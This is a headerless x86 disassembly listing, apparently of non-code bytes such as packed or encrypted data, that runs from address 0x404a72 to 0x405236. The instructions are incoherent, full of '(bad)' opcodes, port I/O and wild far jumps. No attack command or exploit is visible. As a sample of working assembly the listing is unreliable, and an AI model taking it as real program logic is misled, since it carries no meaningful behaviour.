  404a72:	xor    BYTE PTR [edx],dl
  404a74:	xor    ah,dl
  404a76:	pop    ebx
  404a77:	out    0xd9,al
  404a79:	push   esp
  404a7a:	(bad)  
  404a7c:	lock pushf 
  404a7e:	mov    bl,0x67
  404a80:	sbb    BYTE PTR [ebx],dh
  404a82:	popa   
  404a83:	call   0x50e1:0xcc9a8b02
  404a8a:	xor    al,0x91
  404a8c:	mov    esi,0xdbb8d5cc
  404a91:	in     al,dx
  404a92:	(bad)  
  404a93:	jge    0x404a87
  404a95:	jo     0x404a9f
  404a97:	mov    al,0x55
  404a99:	test   BYTE PTR [edi-0x3b],bl
  404a9c:	bound  esp,QWORD PTR [eax]
  404a9e:	fadd   DWORD PTR [eax-0x55740a58]
  404aa4:	cmp    BYTE PTR [ecx+0x4d],bl
  404aa7:	outs   dx,BYTE PTR ds:[esi]
  404aa8:	push   esi
  404aa9:	ret    0x674
  404aac:	(bad)  
  404aad:	xor    al,BYTE PTR [ebp+0x4]
  404ab0:	stc    
  404ab1:	pop    esp
  404ab2:	xor    eax,0x29a78825
  404ab7:	das    
  404ab8:	ins    DWORD PTR es:[edi],dx
  404ab9:	mov    BYTE PTR ds:0x6a2983f9,bh
  404abf:	adc    BYTE PTR [eax+0x77eb4676],0x8c
  404ac6:	inc    ebx
  404ac7:	clc    
  404ac8:	lods   eax,DWORD PTR ds:[esi]
  404ac9:	jl     0x404b34
  404acb:	lods   eax,DWORD PTR ds:[esi]
  404acc:	ds shl bh,1
  404acf:	inc    ebx
  404ad0:	inc    DWORD PTR [ebp+ebx*8-0x4a]
  404ad4:	lds    ebx,FWORD PTR [eax+eiz*8]
  404ad7:	std    
  404ad8:	sbb    bl,BYTE PTR [ebx-0x42f6a6a0]
  404ade:	cli    
  404adf:	call   0xb8a7dd43
  404ae4:	popf   
  404ae5:	dec    ecx
  404ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ae7:	stos   BYTE PTR es:[edi],al
  404ae8:	sbb    edi,DWORD PTR ds:0xd2fddc84
  404aee:	and    eax,DWORD PTR [edi+0x7f]
  404af1:	add    al,0x64
  404af3:	mov    edi,0xa076f9a7
  404af8:	in     al,0xab
  404afa:	mov    WORD PTR [eax+0x30],ds
  404afd:	fsub   QWORD PTR [ebx+0x26]
  404b00:	mov    eax,0x37075a87
  404b05:	push   ebp
  404b06:	xchg   ebp,eax
  404b07:	(bad)  
  404b08:	mov    dh,0xb4
  404b0a:	push   ebp
  404b0b:	mov    ds:0x847bb3a1,al
  404b10:	stc    
  404b11:	stos   BYTE PTR es:[edi],al
  404b12:	xor    DWORD PTR [edi+eiz*1],ecx
  404b15:	xor    esp,DWORD PTR [eax-0x1987dde5]
  404b1b:	cli    
  404b1c:	pop    ss
  404b1d:	sub    esi,DWORD PTR [ebp+eax*1-0x298438ce]
  404b24:	pop    esp
  404b25:	ja     0x404afc
  404b27:	popf   
  404b28:	xlat   BYTE PTR ds:[ebx]
  404b29:	add    DWORD PTR [edi+0x62],eax
  404b2c:	jne    0x404b9b
  404b2e:	lods   eax,DWORD PTR ds:[esi]
  404b2f:	jge    0x404ac7
  404b31:	sbb    DWORD PTR [edi],0x8ab3a04
  404b37:	icebp  
  404b38:	xchg   ebx,eax
  404b39:	(bad)  
  404b3a:	(bad)  
  404b3b:	mov    bh,0x2a
  404b3d:	addr16 and dl,dh
  404b40:	jge    0x404b85
  404b42:	call   0xe3222556
  404b47:	in     eax,0x97
  404b49:	or     al,0x39
  404b4b:	clc    
  404b4c:	xor    BYTE PTR [edi+0x46],ch
  404b4f:	push   ebx
  404b50:	push   ecx
  404b51:	lods   eax,DWORD PTR ds:[esi]
  404b52:	cmp    ebp,DWORD PTR [eax-0x2a]
  404b55:	and    DWORD PTR [ebp-0x1d],ebp
  404b58:	fadd   QWORD PTR [ebp+0x4a6c50d4]
  404b5e:	rcl    BYTE PTR [edx],cl
  404b60:	mov    WORD PTR [ebp+0x6e],es
  404b63:	fld    TBYTE PTR [esi]
  404b65:	sub    DWORD PTR [esi+0x4a299264],ecx
  404b6b:	push   ebp
  404b6c:	push   ebp
  404b6d:	cmp    ah,BYTE PTR [ecx*1-0x49c5a82a]
  404b74:	lock pop edx
  404b76:	daa    
  404b77:	out    0x3b,eax
  404b79:	cdq    
  404b7a:	ror    bh,1
  404b7c:	sub    dh,BYTE PTR [ecx-0x4c547253]
  404b82:	sbb    DWORD PTR [ecx+0x1e],0xd809bf62
  404b89:	inc    esp
  404b8a:	enter  0x1c48,0x6c
  404b8e:	pop    esp
  404b8f:	out    dx,eax
  404b90:	or     ebx,DWORD PTR [ebx+0x5ba0fb40]
  404b96:	sub    cl,BYTE PTR [edx+0x36]
  404b99:	test   eax,0x737dcb2a
  404b9e:	test   eax,eax
  404ba0:	shr    BYTE PTR [ebx+ecx*4-0x6b],cl
  404ba4:	test   eax,0x39814805
  404ba9:	pop    eax
  404baa:	loop   0x404c11
  404bac:	xlat   BYTE PTR ds:[ebx]
  404bad:	lods   al,BYTE PTR ds:[esi]
  404bae:	or     al,0xb
  404bb0:	dec    edi
  404bb1:	inc    ebp
  404bb2:	or     dh,ch
  404bb4:	fs loope 0x404bf7
  404bb7:	inc    esp
  404bb8:	push   0xa2781d5c
  404bbd:	(bad)
  404bc2:	mov    al,ds:0x1cf891c9
  404bc7:	or     bl,BYTE PTR [ebp-0x28]
  404bca:	and    BYTE PTR [esi-0x75],bl
  404bcd:	fsincos 
  404bcf:	sub    al,0x53
  404bd1:	sub    bh,0x38
  404bd4:	dec    ebp
  404bd5:	mov    eax,ds:0xce1625c7
  404bda:	pop    ebp
  404bdb:	popf   
  404bdc:	(bad)  
  404bde:	out    0xdb,al
  404be0:	rcl    BYTE PTR [ebx+0x5b],0x4f
  404be4:	inc    eax
  404be5:	mov    WORD PTR [ecx+0x2],ds
  404be8:	cld    
  404be9:	xchg   esp,eax
  404bea:	adc    DWORD PTR ds:0xe4c762d,ebp
  404bf0:	test   eax,0x9b8d6b84
  404bf5:	mov    ebp,DWORD PTR [eax-0x28]
  404bf8:	repz (bad) 
  404bfa:	lds    edx,FWORD PTR [ecx+0x2d1e1aaf]
  404c00:	xchg   esi,eax
  404c01:	or     DWORD PTR [eax+ecx*4],esp
  404c04:	xchg   DWORD PTR [esi-0x48abf825],ebx
  404c0a:	pop    edx
  404c0b:	push   esi
  404c0c:	jns    0x404c31
  404c0e:	and    al,0x84
  404c10:	push   cs
  404c11:	add    dl,BYTE PTR [ecx-0xa]
  404c14:	add    bh,BYTE PTR [edx-0x2037f764]
  404c1a:	(bad)  
  404c1c:	jl     0x404c0f
  404c1e:	inc    edx
  404c1f:	and    eax,0x2ae33ee1
  404c24:	aas    
  404c25:	xor    al,0x6b
  404c27:	out    dx,eax
  404c28:	mov    al,0x67
  404c2a:	adc    bh,BYTE PTR [edi-0x4cca8e6]
  404c30:	jbe    0x404c2f
  404c32:	push   eax
  404c33:	or     eax,0x2a97db3
  404c38:	or     DWORD PTR [esi+0x75],0x841a926e
  404c3f:	or     ah,BYTE PTR [eax-0x649c17b5]
  404c45:	jnp    0x404c07
  404c47:	mov    edi,0xb4ade56e
  404c4c:	sbb    DWORD PTR [ecx-0x4f],ecx
  404c4f:	(bad)  
  404c50:	mov    eax,0xbec8e6e4
  404c55:	cmp    ebp,ebp
  404c57:	sahf   
  404c58:	es xchg ecx,eax
  404c5a:	adc    al,BYTE PTR [edx]
  404c5c:	pop    ds
  404c5d:	cmp    eax,0x53d6c432
  404c62:	dec    BYTE PTR [edi]
  404c64:	xchg   ebp,eax
  404c65:	loop   0x404bea
  404c67:	sub    dh,dl
  404c69:	aad    0xbf
  404c6b:	xor    al,0xea
  404c6d:	mov    ds:0xeecd8ae1,eax
  404c72:	sar    DWORD PTR [eax+0x61],1
  404c75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c76:	cmp    DWORD PTR [edx-0x107ed5fd],ebp
  404c7c:	xchg   BYTE PTR [ecx-0x6b],al
  404c7f:	inc    esp
  404c80:	push   ebp
  404c81:	inc    edi
  404c82:	or     edx,DWORD PTR [edx-0x71]
  404c85:	cmp    eax,0xd94520fe
  404c8a:	fcomp  DWORD PTR [edi-0x5dc46465]
  404c90:	or     ch,BYTE PTR [ebp-0x3b1201f7]
  404c96:	mov    ds:0x7eb1820a,eax
  404c9b:	sbb    DWORD PTR [ecx+0x62],esp
  404c9e:	adc    edi,DWORD PTR [ebp-0xc]
  404ca1:	push   ecx
  404ca2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ca4:	cmp    al,0x2e
  404ca6:	sub    BYTE PTR [esi],ch
  404ca8:	in     eax,0xb9
  404caa:	sub    al,BYTE PTR gs:[eax]
  404cad:	sahf   
  404cae:	or     BYTE PTR [ebx-0x5a385aaf],bh
  404cb4:	stos   DWORD PTR es:[edi],eax
  404cb5:	push   eax
  404cb6:	sub    DWORD PTR [ebx-0x5fd56564],ebx
  404cbc:	xchg   bl,cl
  404cbe:	push   esi
  404cbf:	sub    BYTE PTR [edi-0x70],0x6f
  404cc3:	add    BYTE PTR [ecx],dh
  404cc5:	fiadd  DWORD PTR [esi]
  404cc7:	or     al,0x50
  404cc9:	or     DWORD PTR [esi+esi*1+0x4a],0xffffffda
  404cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ccf:	fadd   st,st(2)
  404cd1:	pop    esi
  404cd2:	push   ds
  404cd3:	dec    ebx
  404cd4:	retf   0xb348
  404cd7:	call   edx
  404cd9:	jecxz  0x404d02
  404cdb:	lahf   
  404cdc:	sub    al,ah
  404cde:	into   
  404cdf:	mov    cl,0xc8
  404ce1:	add    esi,esi
  404ce3:	sub    al,0x57
  404ce5:	ins    DWORD PTR es:[edi],dx
  404ce6:	jae    0x404d52
  404ce8:	pop    ds
  404ce9:	clc    
  404cea:	add    eax,0xa334ec1a
  404cef:	fiadd  WORD PTR [edi+0x5013610f]
  404cf5:	inc    edx
  404cf6:	cmp    dh,BYTE PTR [edx+0x51]
  404cf9:	test   eax,0xdb17823f
  404cfe:	cmp    eax,0x41461006
  404d03:	xor    BYTE PTR [edx],0xef
  404d06:	test   eax,0x3b71cd0c
  404d0b:	ss in  eax,dx
  404d0d:	jmp    0xf658:0xf8f99524
  404d14:	fistp  QWORD PTR [edi+0x4ce10f8b]
  404d1a:	pop    ebx
  404d1b:	xchg   esi,eax
  404d1c:	js     0x404d43
  404d1e:	outs   dx,DWORD PTR ds:[esi]
  404d1f:	mov    dh,0xf9
  404d21:	push   cs
  404d22:	std    
  404d23:	(bad)  [edi+0x5c]
  404d26:	cmp    al,0xc3
  404d28:	jnp    0x404ce7
  404d2a:	pop    ebx
  404d2b:	in     eax,0xad
  404d2d:	repz sub DWORD PTR [edi+0x44],eax
  404d31:	out    dx,al
  404d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d33:	mov    eax,DWORD PTR [edx]
  404d35:	sub    ecx,DWORD PTR [ebx-0x7c5385f3]
  404d3b:	fist   DWORD PTR [edi+0x20]
  404d3e:	fcomp  st(6)
  404d40:	xor    DWORD PTR [ebp+0x12808738],edx
  404d46:	sbb    al,0x22
  404d49:	and    eax,DWORD PTR [eax+edx*2+0x74]
  404d4d:	leave  
  404d4e:	mov    ebp,0xe84a712b
  404d53:	jg     0x404d85
  404d55:	retf   
  404d56:	repnz inc eax
  404d58:	rcr    DWORD PTR [eax+0x27a37fa5],1
  404d5e:	repnz and DWORD PTR [ebx-0x30820374],esi
  404d65:	ficomp DWORD PTR [edi-0x73555516]
  404d6b:	or     bl,al
  404d6d:	jl     0x404d52
  404d6f:	sub    ecx,DWORD PTR [ebx-0xd]
  404d72:	imul   eax,ebx,0x781a488
  404d78:	stos   DWORD PTR es:[edi],eax
  404d79:	fs retf 
  404d7b:	(bad)  
  404d7c:	mov    esp,0x4d28f881
  404d81:	call   FWORD PTR [ecx+0x1e]
  404d84:	das    
  404d85:	fistp  DWORD PTR [edi-0x4a]
  404d88:	jmp    0x1b0db548
  404d8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d8e:	add    al,0x73
  404d90:	int3   
  404d91:	retw   
  404d93:	mov    dh,0xb9
  404d95:	stos   DWORD PTR es:[edi],eax
  404d96:	iret   
  404d97:	and    al,0x1c
  404d99:	add    al,0x3d
  404d9b:	xchg   esi,eax
  404d9c:	dec    esi
  404d9d:	test   BYTE PTR [ebp-0x63902698],al
  404da3:	mov    esi,esi
  404da5:	fld    DWORD PTR [eax-0x49116a87]
  404dab:	jmp    0x907d:0x129a6f13
  404db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404db3:	out    0x4,al
  404db5:	mov    ebp,0x287f680e
  404dba:	jge    0x404e18
  404dbc:	cmc    
  404dbd:	cmp    edi,DWORD PTR [edi]
  404dbf:	(bad)  
  404dc0:	xlat   BYTE PTR ds:[ebx]
  404dc1:	mov    bl,0xbf
  404dc3:	cmp    DWORD PTR [eax-0x53],esp
  404dc6:	in     eax,0x5a
  404dc8:	popf   
  404dc9:	xchg   esp,eax
  404dca:	push   edi
  404dcb:	repz inc edx
  404dcd:	gs leave 
  404dcf:	push   0x33
  404dd1:	test   al,0x80
  404dd3:	std    
  404dd4:	cdq    
  404dd5:	loop   0x404da8
  404dd7:	(bad)  
  404dd8:	aad    0x86
  404dda:	nop
  404ddb:	xor    ecx,DWORD PTR [ebp-0x37]
  404dde:	fstp   TBYTE PTR [esi+esi*1+0x51]
  404de2:	adc    al,0xa2
  404de4:	and    edi,DWORD PTR [edi]
  404de6:	cmc    
  404de7:	jg     0x404e59
  404de9:	ins    DWORD PTR es:[edi],dx
  404dea:	xor    eax,0x944a83f4
  404def:	fisttp WORD PTR [esi-0x7d2d4b6e]
  404df5:	push   ds
  404df6:	mov    cl,0xd3
  404df8:	ins    BYTE PTR es:[edi],dx
  404df9:	aad    0x79
  404dfb:	xor    eax,DWORD PTR [esi]
  404dfd:	cmp    ebx,DWORD PTR [edx+0x3b]
  404e00:	sub    ah,BYTE PTR [ebx+0x36]
  404e03:	push   0x10f9a983
  404e08:	cmp    DWORD PTR [ebx-0x57],0xffffffb5
  404e0c:	sti    
  404e0d:	cs mov cl,0x0
  404e10:	cmp    dl,BYTE PTR [ecx+0x36191049]
  404e16:	call   0x68b3bdd2
  404e1b:	pop    ebp
  404e1c:	inc    eax
  404e1d:	lea    ebp,[edx-0x6b906233]
  404e23:	lds    edi,FWORD PTR [eax]
  404e25:	sti    
  404e26:	into   
  404e27:	mov    esp,0xc3d99f9b
  404e2c:	out    0x59,al
  404e2e:	mov    ch,BYTE PTR [ebx]
  404e30:	mov    esp,0xba287dc5
  404e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e36:	fsub   st,st(4)
  404e38:	sbb    BYTE PTR [ebp+0x7c508418],0x77
  404e3f:	inc    edi
  404e40:	sbb    eax,DWORD PTR [edx+0x7d]
  404e43:	mov    ?,WORD PTR ds:0xef96677e
  404e49:	std    
  404e4a:	and    al,0x10
  404e4c:	aaa    
  404e4d:	shl    DWORD PTR [edi+0x59],cl
  404e50:	or     DWORD PTR [eax],eax
  404e52:	daa    
  404e53:	sub    eax,0x156ca7d1
  404e58:	retf   
  404e59:	or     ah,BYTE PTR [edi]
  404e5b:	aad    0x3f
  404e5d:	test   BYTE PTR ds:0x6308b73c,0x9c
  404e64:	pop    eax
  404e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e66:	mov    DWORD PTR [edi],0x81a85252
  404e6c:	test   al,0x5
  404e6e:	adc    BYTE PTR [ecx],ch
  404e70:	or     edx,esi
  404e72:	sub    eax,0x11edb977
  404e77:	jmp    0xcf57:0x6b20b462
  404e7e:	cmp    BYTE PTR [esp+eiz*8-0xad34014],cl
  404e85:	jb     0x404e38
  404e87:	aam    0xc
  404e89:	dec    edx
  404e8a:	or     ebx,DWORD PTR [esi+0x1079c9a5]
  404e90:	gs cmp eax,0x52968659
  404e96:	jbe    0x404f15
  404e98:	sbb    DWORD PTR [edi-0x77],ebp
  404e9b:	mov    ebx,0x916a9056
  404ea0:	ja     0x404e87
  404ea2:	sbb    ah,BYTE PTR [eax-0x35ac06de]
  404ea8:	push   cs
  404ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eaa:	or     al,0xfb
  404eac:	imul   ebx,esi,0xa
  404eaf:	mov    ah,0xe8
  404eb1:	mov    ds:0x22d25dcb,al
  404eb6:	ja     0x404f07
  404eb8:	int3   
  404eb9:	mov    eax,0xef90404a
  404ebe:	aas    
  404ebf:	scas   al,BYTE PTR es:[edi]
  404ec0:	push   esi
  404ec1:	cmp    dh,BYTE PTR [edx]
  404ec3:	stc    
  404ec4:	cs cmc 
  404ec6:	push   esi
  404ec7:	mov    bh,0xb6
  404ec9:	pop    es
  404eca:	repnz xchg edx,eax
  404ecc:	inc    esp
  404ecd:	fdiv   st(5),st
  404ecf:	inc    ecx
  404ed0:	sub    al,0xd3
  404ed2:	scas   eax,DWORD PTR es:[edi]
  404ed3:	xchg   BYTE PTR [eax+0x4cead12f],bh
  404ed9:	xchg   ecx,eax
  404eda:	push   ebx
  404edb:	(bad)  
  404edc:	into   
  404edd:	and    eax,0xb67972c0
  404ee2:	fisub  DWORD PTR [esp+edx*8]
  404ee5:	jae    0x404eee
  404ee7:	jns    0x404ebe
  404ee9:	or     BYTE PTR [esi+eax*8-0x34058f09],0xf0
  404ef1:	retf   
  404ef2:	xor    al,ah
  404ef4:	add    eax,0xbbcea730
  404ef9:	icebp  
  404efa:	ret    
  404efb:	jg     0x404f74
  404efd:	mov    al,ds:0x944b8532
  404f02:	call   0x6be592c7
  404f07:	pop    esp
  404f08:	push   ss
  404f09:	push   es
  404f0a:	shl    BYTE PTR [ebp+esi*8-0x3a6acb1b],1
  404f11:	mov    ds:0xf1f3177e,al
  404f16:	arpl   WORD PTR [ebx],bp
  404f18:	dec    edx
  404f19:	fstp   st(2)
  404f1b:	fwait
  404f1c:	test   BYTE PTR [ecx+0x1159a691],bh
  404f22:	ins    DWORD PTR es:[edi],dx
  404f23:	jbe    0x404f96
  404f25:	add    esp,edx
  404f27:	push   ds
  404f28:	mov    esp,0x10e90615
  404f2d:	xchg   esi,eax
  404f2e:	or     BYTE PTR [eax+0x2b],ch
  404f31:	dec    edx
  404f32:	cdq    
  404f33:	dec    edi
  404f34:	xchg   BYTE PTR [ebp+eax*4-0x18b4d974],al
  404f3b:	pop    ebx
  404f3c:	jno    0x404f49
  404f3e:	(bad)  
  404f3f:	clc    
  404f40:	arpl   WORD PTR [eax],sp
  404f42:	jecxz  0x404eca
  404f44:	sbb    eax,0x6d3acc69
  404f49:	(bad)  
  404f4a:	in     eax,dx
  404f4b:	mov    esp,esp
  404f4d:	neg    DWORD PTR [esp+eax*2-0x6f879dff]
  404f54:	in     eax,dx
  404f55:	popf   
  404f56:	jbe    0x404f94
  404f58:	fist   DWORD PTR [eax+0x67]
  404f5b:	icebp  
  404f5c:	rcr    DWORD PTR [ecx+0x61],cl
  404f5f:	push   esp
  404f60:	fistp  WORD PTR gs:[ebp+0x1e]
  404f64:	leave  
  404f65:	cmp    eax,0x5c6548bf
  404f6a:	pushf  
  404f6b:	and    DWORD PTR [edi],ecx
  404f6d:	mov    edi,0x32642cd6
  404f72:	dec    ebp
  404f73:	(bad)  
  404f74:	sbb    BYTE PTR [ebp+0x1c],bh
  404f77:	pop    edi
  404f78:	xchg   esi,eax
  404f79:	or     eax,0x28f7d06e
  404f7e:	sub    BYTE PTR ds:[esi+0x3718db68],cl
  404f85:	mov    BYTE PTR [ecx+edx*1+0x4ab60ec5],ch
  404f8c:	enter  0xf2ca,0x6f
  404f90:	add    ebx,0x7
  404f93:	retf   
  404f94:	dec    esp
  404f95:	jge    0x404f70
  404f97:	iret   
  404f98:	inc    ebx
  404f99:	imul   ebx,DWORD PTR [eax],0xffffffc1
  404f9c:	loop   0x404f6e
  404f9e:	xchg   esp,eax
  404f9f:	sbb    eax,0x78dec5eb
  404fa4:	jne    0x404f8d
  404fa6:	ds jnp 0x404fc9
  404fa9:	mov    WORD PTR [ecx+edx*2],fs
  404fac:	dec    ecx
  404fad:	mov    dh,0x84
  404faf:	xchg   edi,eax
  404fb0:	inc    edx
  404fb1:	pop    edi
  404fb2:	inc    esi
  404fb3:	xor    BYTE PTR [ebx],0xa7
  404fb6:	cwde   
  404fb7:	mov    bl,0x77
  404fb9:	push   ebp
  404fba:	dec    eax
  404fbb:	cmp    al,0xf
  404fbd:	lds    edi,FWORD PTR [eax-0x70]
  404fc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fc1:	retf   0xde7e
  404fc4:	push   esi
  404fc5:	mov    al,ds:0xe6e02473
  404fca:	mov    eax,ds:0x2bd93cdf
  404fcf:	scas   eax,DWORD PTR es:[edi]
  404fd0:	shr    dh,cl
  404fd2:	int3   
  404fd3:	pop    eax
  404fd4:	cdq    
  404fd5:	leave  
  404fd6:	add    ebx,edi
  404fd8:	xchg   ebx,eax
  404fd9:	sub    al,0x7e
  404fdb:	push   ebp
  404fdc:	and    eax,0x8e400d18
  404fe1:	sub    BYTE PTR [eax+0x1466e55d],bh
  404fe7:	fs jnp 0x404fd3
  404fea:	idiv   ah
  404fec:	shl    DWORD PTR [eax+0x263c468],cl
  404ff2:	pop    ebp
  404ff3:	push   esi
  404ff4:	mov    bh,0x2c
  404ff6:	dec    ecx
  404ff7:	add    esp,0xed1e1e01
  404ffd:	sub    al,0x19
  404fff:	sar    DWORD PTR [ebp+0x6b271971],cl
  405005:	and    eax,0xe1215f83
  40500a:	int3   
  40500b:	adc    BYTE PTR [esi+ebx*1+0x41],cl
  40500f:	sub    eax,0x8472c442
  405014:	repnz push ecx
  405016:	leave  
  405017:	mov    al,0x47
  405019:	(bad)  
  40501a:	retf   
  40501b:	xor    ebp,ebx
  40501d:	pop    ss
  40501e:	jns    0x405083
  405020:	scas   eax,DWORD PTR es:[edi]
  405021:	xchg   edx,eax
  405022:	xor    cl,BYTE PTR [ecx-0x40]
  405025:	jmp    0xf41a5b4
  40502a:	xor    DWORD PTR [ebp+0xc],0xb41739d
  405031:	push   ds
  405032:	push   0x4e982f95
  405037:	dec    eax
  405038:	ins    BYTE PTR es:[edi],dx
  405039:	sbb    DWORD PTR [ebx-0x62],esi
  40503c:	cmp    BYTE PTR [ebx+0x8a632ff],bl
  405042:	call   0x4a7d4562
  405047:	fnstsw WORD PTR [ebp-0x439d8573]
  40504d:	shr    cl,0xed
  405050:	stos   DWORD PTR es:[edi],eax
  405051:	cdq    
  405052:	xor    ecx,esp
  405054:	mov    dh,0x68
  405056:	or     eax,0xf5c2a6dc
  40505b:	nop
  40505c:	mov    edi,0x14683496
  405061:	sbb    al,0x63
  405063:	bound  edi,QWORD PTR [ebx]
  405065:	ins    DWORD PTR es:[edi],dx
  405066:	out    dx,al
  405067:	fiadd  WORD PTR [ecx-0x5ce426b4]
  40506d:	(bad)  
  40506e:	retw   0x8738
  405072:	inc    ebp
  405073:	adc    ebx,DWORD PTR [edi]
  405075:	inc    esi
  405076:	mov    esi,0x962aa730
  40507b:	stc    
  40507c:	xchg   DWORD PTR [edx-0x3a0ac336],eax
  405082:	ret    0xe233
  405085:	sub    eax,0x149861b7
  40508a:	and    DWORD PTR [eax-0x3],esi
  40508d:	in     eax,dx
  40508e:	repz pushf 
  405090:	mov    esi,0x509f79f4
  405095:	aaa    
  405096:	cs das 
  405098:	jne    0x4050c7
  40509a:	iret   
  40509b:	sub    al,0x5f
  40509e:	or     esp,DWORD PTR [edi-0x7751e055]
  4050a4:	pop    DWORD PTR ds:0x5e659450
  4050aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050ab:	add    BYTE PTR [ebp-0x446756fb],dh
  4050b1:	aas    
  4050b2:	aaa    
  4050b3:	xor    al,0x43
  4050b5:	sbb    dl,BYTE PTR [ecx-0x40]
  4050b8:	sahf   
  4050b9:	ficomp WORD PTR [esi]
  4050bb:	call   0xe342fa04
  4050c0:	arpl   sp,bp
  4050c2:	push   esp
  4050c3:	inc    ebp
  4050c4:	cmp    BYTE PTR [esi-0x647142b6],0xd7
  4050cb:	int    0x92
  4050cd:	test   eax,0x6aa9b45e
  4050d2:	loope  0x405138
  4050d4:	test   BYTE PTR [edx-0x71],ah
  4050d7:	jl     0x4050e2
  4050d9:	or     ebp,edi
  4050db:	aaa    
  4050dc:	iret   
  4050dd:	hlt    
  4050de:	mov    esp,0xb786e005
  4050e3:	fwait
  4050e4:	in     eax,0x38
  4050e6:	sti    
  4050e7:	mov    al,BYTE PTR [ebp+0x794979a5]
  4050ed:	ret    0x2b03
  4050f0:	dec    esi
  4050f1:	jmp    0xb2eb:0xc3d33d74
  4050f8:	sahf   
  4050f9:	mov    ebx,0xa99cedd2
  4050fe:	xlat   BYTE PTR ds:[ebx]
  4050ff:	cmp    al,0xf2
  405101:	xor    edi,esi
  405103:	lods   eax,DWORD PTR ds:[esi]
  405104:	inc    edx
  405105:	fwait
  405106:	xchg   bh,al
  405108:	dec    eax
  405109:	outs   dx,BYTE PTR ds:[esi]
  40510a:	push   eax
  40510b:	push   edx
  40510c:	lods   al,BYTE PTR ds:[esi]
  40510d:	jmp    0x405174
  40510f:	cmc    
  405110:	mov    BYTE PTR [esi],bh
  405112:	jnp    0x405149
  405114:	cmp    bh,BYTE PTR [edi-0x59]
  405117:	sub    eax,0xea61fdf9
  40511c:	fld    DWORD PTR [edi-0x4e]
  40511f:	lods   eax,DWORD PTR ds:[esi]
  405120:	aad    0x43
  405122:	push   0xffffffa7
  405124:	inc    ecx
  405125:	ins    DWORD PTR es:[edi],dx
  405126:	into   
  405127:	or     DWORD PTR [eax+edi*1-0x1c2fff5],edi
  40512e:	stos   BYTE PTR es:[edi],al
  40512f:	jl     0x40512f
  405131:	and    eax,0x6c722a9b
  405136:	pop    eax
  405137:	scas   eax,DWORD PTR es:[edi]
  405138:	sbb    DWORD PTR [esi-0xc87df18],0xffffffa4
  40513f:	sbb    al,0xed
  405141:	ret    0xfa19
  405144:	loop   0x405134
  405146:	jns    0x40518f
  405148:	out    dx,eax
  405149:	xlat   BYTE PTR ds:[ebx]
  40514a:	shl    DWORD PTR [edi+0x53e95c23],1
  405150:	sub    cl,BYTE PTR [esi+0x5a5dc0d8]
  405156:	cmp    al,0x89
  405158:	ret    0x50ba
  40515b:	je     0x4051b0
  40515d:	mov    bl,0x28
  40515f:	or     edi,ebx
  405161:	adc    cl,BYTE PTR [eax]
  405163:	nop
  405164:	in     al,dx
  405165:	fisttp QWORD PTR [edx+0x7f]
  405168:	and    BYTE PTR [edx],ah
  40516a:	sub    DWORD PTR [ebx],ebp
  40516c:	or     ebx,edi
  40516e:	mov    ecx,0xa11f3003
  405173:	mov    ebx,0x2fafb61f
  405178:	das    
  405179:	lock sahf 
  40517b:	fmul   QWORD PTR [esi-0x39]
  40517e:	or     eax,0xc4f06a7f
  405183:	in     eax,0x2
  405185:	out    dx,eax
  405186:	out    0xcb,eax
  405188:	test   eax,ebx
  40518a:	fucomp st(0)
  40518c:	les    ecx,FWORD PTR [eax-0x17a83a6c]
  405192:	mov    al,ds:0xf3d53d7a
  405197:	xchg   esi,eax
  405198:	mov    esp,0x5fcb4977
  40519d:	fwait
  40519e:	retf   
  40519f:	pusha  
  4051a0:	aad    0xef
  4051a2:	adc    al,0x94
  4051a4:	pop    edi
  4051a5:	les    ebx,FWORD PTR [ebp+0x6f]
  4051a8:	mov    ah,0xc0
  4051aa:	and    BYTE PTR [esi+0x72],al
  4051ad:	repnz rcr DWORD PTR [ebx-0x21db62f7],0x40
  4051b5:	or     DWORD PTR [ebp-0x18ca6eb9],ebp
  4051bb:	(bad)  
  4051bc:	imul   edx
  4051be:	in     eax,0xb6
  4051c0:	out    dx,eax
  4051c1:	sbb    edi,DWORD PTR [edi-0x92c4bd7]
  4051c7:	xor    esp,DWORD PTR [eax]
  4051c9:	hlt    
  4051ca:	ret    
  4051cb:	push   ds
  4051cc:	out    dx,al
  4051cd:	push   ebp
  4051ce:	dec    ecx
  4051cf:	cmp    esp,DWORD PTR [ebp+0x36]
  4051d2:	xchg   BYTE PTR [ebx+edx*2],bl
  4051d5:	mov    ?,WORD PTR [edx+0x5f7caba2]
  4051db:	in     al,0x2b
  4051dd:	cmp    dl,al
  4051df:	aas    
  4051e0:	sub    eax,0xa8ff4460
  4051e5:	mov    BYTE PTR [edx+0x29dfca2b],ah
  4051eb:	arpl   WORD PTR [edx],ax
  4051ed:	push   ecx
  4051ee:	fimul  DWORD PTR [ebx]
  4051f0:	imul   BYTE PTR [edx]
  4051f2:	std    
  4051f3:	mov    al,ds:0xd4242e99
  4051f8:	xor    eax,ebp
  4051fa:	pop    es
  4051fb:	js     0x405197
  4051fd:	(bad)  
  4051fe:	ror    BYTE PTR [edx-0x13],cl
  405201:	ficomp DWORD PTR [ebp-0x1f]
  405204:	sbb    eax,DWORD PTR [ebx-0x10]
  405207:	add    BYTE PTR [ebp-0x40],0xf9
  40520b:	pop    ds
  40520c:	or     al,0xd1
  40520e:	dec    ecx
  40520f:	push   ecx
  405210:	lock inc edx
  405212:	fistp  DWORD PTR [ebx-0x34]
  405215:	pop    ebp
  405217:	mov    ebp,0x49210efd
  40521c:	mov    gs:0xe4f71c58,al
  405222:	fdiv   st,st(2)
  405224:	sbb    eax,0x27d5f61a
  405229:	stos   BYTE PTR es:[edi],al
  40522a:	data16 jmp 0x4051cd
  40522d:	jge    0x4051e7
  40522f:	jmp    0x40523d
  405231:	sub    BYTE PTR [edx-0x20],0xd0
  405235:	outs   dx,BYTE PTR ds:[esi]
  405236:	pop    edx
